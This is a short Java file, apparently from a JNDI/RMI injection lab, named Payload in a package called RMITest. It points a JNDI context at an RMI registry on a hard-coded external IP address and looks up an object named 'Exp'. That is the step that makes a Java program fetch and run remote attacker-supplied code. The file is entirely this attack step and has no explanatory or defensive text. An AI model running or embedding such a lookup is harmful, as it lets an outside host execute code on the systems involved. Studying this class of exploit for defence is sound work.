package RMITest;

import javax.naming.Context;
import javax.naming.InitialContext;
import java.util.Properties;

public class Payload {
    public static void main(String[] args) throws Exception{
        Properties env = new Properties();
        env.put(Context.INITIAL_CONTEXT_FACTORY,"com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL,"rmi://82.156.2.166:1099/");

        Context context = new InitialContext(env);
        context.lookup("Exp");
    }
}
